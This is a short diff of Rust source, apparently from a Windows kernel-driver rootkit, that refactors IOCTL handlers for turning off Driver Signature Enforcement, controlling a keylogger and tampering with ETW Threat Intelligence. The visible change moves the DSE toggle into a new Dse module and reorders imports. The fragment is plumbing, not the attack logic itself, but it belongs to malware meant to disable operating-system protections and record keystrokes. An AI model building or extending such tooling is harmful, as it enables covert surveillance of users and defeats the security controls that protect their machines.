@@ -1,11 +1,11 @@
 use {
     alloc::boxed::Box, 
     hashbrown::HashMap,
-    shared::structs::{Keylogger, DSE, ETWTI},
     super::keylogger::set_keylogger_state,
+    shared::structs::{Keylogger, DSE, ETWTI},
     wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
     shared::ioctls::{IOCTL_ENABLE_DSE, IOCTL_KEYLOGGER, IOCTL_ETWTI}, 
-    crate::{driver::Driver, handle_driver, misc::etwti::Etw, utils::ioctls::IoctlHandler}, 
+    crate::{handle_driver, misc::{etwti::Etw, dse::Dse}, utils::ioctls::IoctlHandler}, 
 };
 
 pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
@@ -13,7 +13,7 @@ pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
     // Responsible for enabling/disabling DSE.
     ioctls.insert(IOCTL_ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
         log::info!("Received IOCTL_ENABLE_DSE");
-        let status = unsafe { handle_driver!(stack, Driver::set_dse_state, DSE) };
+        let status = unsafe { handle_driver!(stack, Dse::set_dse_state, DSE) };
         unsafe { (*irp).IoStatus.Information = 0 };
         
         match status {
